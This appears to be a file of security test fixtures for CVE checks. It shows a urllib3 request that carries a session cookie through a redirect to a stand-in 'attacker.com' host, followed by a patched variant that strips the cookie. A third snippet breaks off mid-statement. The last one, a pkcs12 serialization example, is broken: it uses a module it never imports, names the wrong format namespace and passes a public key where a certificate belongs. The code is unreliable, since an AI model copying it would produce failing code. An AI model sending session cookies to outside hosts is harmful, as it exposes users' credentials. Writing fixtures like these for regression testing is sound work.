import json
from urllib3 import PoolManager, Retry

with PoolManager() as http:
    r = http.request(
        'GET',
        'http://example.com/redirect',
        fields={'target': 'http://attacker.com/headers'},
        headers={'Cookie': 'sessionid=abc123'},
        retries=Retry()
    )
    data = json.loads(r.data.decode('utf-8'))
    assert 'Cookie' not in data
perCve.safeFixture:
import json
from urllib3 import PoolManager, Retry

with PoolManager() as http:
    r = http.request(
        'GET',
        'http://example.com/redirect',
        fields={'target': 'http://attacker.com/headers'},
        headers={'Cookie': 'sessionid=abc123'},
        retries=Retry(remove_headers_on_redirect=['Cookie'])
    )
    data = json.loads(r.data.decode('utf-8'))
    assert 'Cookie' not in data

import urllib3

with urllib3.PoolManager() as http:
    resp = http.request('POST', 'http://example.com/redirect',

perCve.safeFixture:
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec

key = ec.generate_private_key(ec.SECP256R1())
cacert = key.public_key().public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
encryption = pkcs12.PrivateFormat.PKCS12.encryption_builder().build(b"password")

pkcs12.serialize_key_and_certificates(b"name", key, cacert, [], encryption)
